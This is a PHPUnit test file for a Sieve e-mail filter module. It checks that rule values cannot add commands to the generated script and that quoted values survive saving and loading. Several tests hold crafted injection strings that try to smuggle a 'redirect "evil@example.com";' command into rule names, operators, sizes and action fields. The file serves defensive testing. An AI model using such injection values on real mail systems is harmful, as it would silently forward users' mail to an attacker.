<?php

namespace go\modules\legacy\sieve;

use GO\Sieve\Util\go_sieve_script;
use GO\Sieve\Util\Sieve;
use PHPUnit\Framework\TestCase;

/**
 * Values of e-mail filter rules are written into the Sieve script. They may not add commands to the script, and
 * loading the script must give back the same values.
 */
class SieveScriptTest extends TestCase
{
	const CAPABILITIES = ['fileinto', 'vacation', 'imap4flags', 'body', 'copy', 'date', 'relational', 'regex', 'reject'];

	private string|false $language = false;

	protected function setUp(): void
	{
		if(!\GO::modules()->isInstalled('sieve')) {
			$this->markTestSkipped('The sieve module is required');
		}
		// the messages are checked in English, whatever language an earlier test left behind
		$this->language = go()->getLanguage()->setLanguage('en');
	}

	protected function tearDown(): void
	{
		if ($this->language !== false) {
			go()->getLanguage()->setLanguage($this->language);
		}
	}

	private function script(string $text = ''): go_sieve_script
	{
		// loads the file with go_sieve_script too
		$sieve = new Sieve();
		return new go_sieve_script($text, self::CAPABILITIES, $sieve);
	}

	private function rule(array $override = []): array
	{
		return array_replace_recursive([
			'name' => 'My rule',
			'disabled' => false,
			'join' => '',
			'tests' => [
				['test' => 'header', 'not' => false, 'type' => 'contains', 'arg' => '', 'arg1' => 'Subject', 'arg2' => 'hello']
			],
			'actions' => [
				['type' => 'fileinto', 'target' => 'INBOX/Hello', 'copy' => false]
			]
		], $override);
	}

	private function asText(array $rule): string
	{
		$script = $this->script();
		$script->add_rule($rule);
		return $script->as_text();
	}

	/**
	 * Throws or returns a script without the injected redirect command
	 */
	private function assertNotInjected(array $rule): void
	{
		try {
			$text = $this->asText($rule);
		} catch (\Exception $e) {
			$this->assertStringContainsString('invalid value', $e->getMessage());
			return;
		}

		foreach($this->script($text)->content as $parsed) {
			foreach($parsed['actions'] ?? [] as $action) {
				$this->assertNotSame('redirect', $action['type'], "A command was injected:\n" . $text);
			}
		}
		$this->assertStringNotContainsString("\nredirect", $text);
	}

	public function testLineBreakInRuleNameIsRefused(): void
	{
		$this->assertNotInjected($this->rule(['name' => "x]\nredirect \"evil@example.com\";\n# rule:[y"]));
	}

	public function testLineBreakInTestOfDisabledRuleIsRefused(): void
	{
		// the tests of a disabled rule are written in a comment
		$this->assertNotInjected($this->rule([
			'disabled' => true,
			'tests' => [['arg2' => "x\n{ }\nredirect \"evil@example.com\";\nif false /*"]]
		]));
	}

	public function testOperatorCanOnlyBeAWord(): void
	{
		$this->assertNotInjected($this->rule([
			'tests' => [['type' => 'is "a" "b" { redirect "evil@example.com"; } if header :contains']]
		]));
	}

	public function testAddressPartCanOnlyBeAWord(): void
	{
		$this->assertNotInjected($this->rule([
			'tests' => [['test' => 'address', 'part' => 'domain "a" "b" { redirect "evil@example.com"; } if address :all', 'arg1' => 'From', 'arg2' => 'example.com']]
		]));
	}

	public function testSizeMustBeANumber(): void
	{
		$this->assertNotInjected($this->rule([
			'tests' => [['test' => 'size', 'type' => 'over', 'arg' => '1 { redirect "evil@example.com"; } if size :over 1']]
		]));
	}

	public function testActionOptionCanOnlyBeAWord(): void
	{
		$this->assertNotInjected($this->rule([
			'actions' => [['type' => 'include', 'target' => 'default', 'x "a"; redirect "evil@example.com"; keep' => true]]
		]));
	}

	public function testQuotedValuesAreEscaped(): void
	{
		$this->assertNotInjected($this->rule([
			'tests' => [['arg2' => 'x" "y" { redirect "evil@example.com"; } if header :contains "a']],
			'actions' => [['target' => 'x"; redirect "evil@example.com"; #']]
		]));
	}

	public function testValuesSurviveSaveAndLoad(): void
	{
		$reason = ".First line\nA line with \"quotes\" and a \\ backslash\n.\n..two dots\nLast line";
		$rule = $this->rule([
			'tests' => [['arg2' => 'a "quoted" \\ value']],
			'actions' => [
				['type' => 'fileinto', 'target' => 'INBOX/With "quote"'],
				['type' => 'vacation', 'days' => 3, 'addresses' => ['a@example.com', 'b@example.com'], 'subject' => 'Away "now"', 'reason' => $reason]
			]
		]);

		$text = $this->asText($rule);
		$parsed = $this->script($text)->content;

		$this->assertCount(1, $parsed, $text);
		$this->assertSame('My rule', $parsed[0]['name']);
		$this->assertSame('a "quoted" \\ value', $parsed[0]['tests'][0]['arg2']);
		$this->assertSame('INBOX/With "quote"', $parsed[0]['actions'][0]['target']);
		$this->assertSame('Away "now"', $parsed[0]['actions'][1]['subject']);
		$this->assertSame(['a@example.com', 'b@example.com'], $parsed[0]['actions'][1]['addresses']);
		$this->assertSame($reason, $parsed[0]['actions'][1]['reason']);
	}
}
